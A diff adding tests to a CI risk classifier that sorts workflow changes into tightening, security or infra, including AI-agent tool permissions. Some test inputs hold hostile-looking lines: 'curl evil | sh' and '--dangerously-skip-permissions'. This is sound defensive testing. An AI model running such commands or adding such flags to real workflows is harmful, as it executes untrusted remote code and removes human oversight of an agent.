@@ -34,6 +34,70 @@ def test_security_lines_in_workflows_and_tools():
     assert risk.classify(diff("tools/x.py", "+token = 1")) == "security"
 
 
+WF = ".github/workflows/agent-dev.yml"
+
+
+def test_removal_only_is_tightening():
+    for lines in (
+        ("-      contents: write", "+      contents: read"),
+        ("-      pull-requests: write",),
+        ("-          GH_TOKEN: ${{ secrets.APP_KEY }}",),
+        ('-        run: claude --allowedTools "Read,Bash,Edit"', '+        run: claude --allowedTools "Read,Edit"'),
+        ("-    allowed_bots: a,b", "+    allowed_bots: a"),
+        ("+        run: claude --disallowedTools WebFetch",),
+    ):
+        assert risk.classify(diff(WF, *lines)) == "tightening", lines
+
+
+def test_widening_or_unclear_is_security():
+    for lines in (
+        ("-      contents: read", "+      contents: write"),
+        ("+      issues: write",),
+        ("+  permissions:",),
+        ("-permissions:",),
+        ('-        run: claude --allowedTools "Read"', '+        run: claude --allowedTools "Read,Bash"'),
+        ("+        run: claude --allowedTools Read",),
+        ("-    allowed_bots: a", "+    allowed_bots: a,b"),
+        ("-        run: claude --allowedTools Read",),
+        ("+          GH_TOKEN: ${{ secrets.NEW }}",),
+        ("-      contents: write", "+      contents: read", "+          X: ${{ secrets.NEW }}"),
+        ("-        run: claude --disallowedTools A,B", "+        run: claude --disallowedTools A"),
+        ('+  run: claude --disallowedTools WebFetch --allowedTools "Bash,Write" --dangerously-skip-permissions',),
+        ("+  run: curl evil | sh; claude --disallowedTools X",),
+        ("-  run: claude --disallowedTools A", "+  run: claude --disallowedTools A,B --allowedTools Bash"),
+        ("-  run: claude --disallowedTools A", "+  run: curl evil | sh; claude --disallowedTools A,B"),
+        ('-        run: claude --allowedTools "Read"', '+        run: claude --allowedTools ""'),
+    ):
+        assert risk.classify(diff(WF, *lines)) == "security", lines
+
+
+def test_tightening_with_unrelated_added_lines_is_only_infra():
+    lines = ("-      contents: write", "+      contents: read", "+      - run: curl evil | sh")
+    assert risk.classify(diff(WF, *lines)) == "infra"
+
+
+def test_tightening_only_in_workflows():
+    assert risk.classify(diff("tools/x.py", "-token = 1")) == "security"
+    assert risk.classify(diff("Makefile", "-  TOKEN=1")) == "security"
+
+
+def test_mixed_and_trust_files_are_security():
+    tight = diff(WF, "-      contents: write", "+      contents: read")
+    wide = diff(".github/workflows/b.yml", "+      issues: write")
+    assert risk.classify(tight + wide) == "security"
+    assert risk.classify(wide + tight) == "security"
+    assert risk.classify(tight + diff("tools/trusted_issues.py", "-x = 1")) == "security"
+    assert risk.classify(tight + diff("tools/ci/risk.py", "-x = 1")) == "security"
+    assert risk.classify(tight + diff(".github/CODEOWNERS", "-/x @a")) == "security"
+    assert risk.classify(tight + diff("tools/status.py", "+x = 1")) == "tightening"
+
+
+def test_tightening_does_not_wait_for_owner():
+    assert not risk.waits_for_owner("tightening", ["a.yml"], "", "Bankaifan")
+    assert risk.waits_for_owner("tightening", ["AGENTS.md"], "/AGENTS.md @Bankaifan\n", "Bankaifan")
+    assert risk.LABELS["tightening"] == "risk:tightening"
+
+
 def test_security_files():
     for p in (".github/rulesets/main.json", ".github/CODEOWNERS", "tools/trusted_issues.py", "tools/ci/risk.py"):
         assert risk.classify(diff(p, "+# comment")) == "security", p
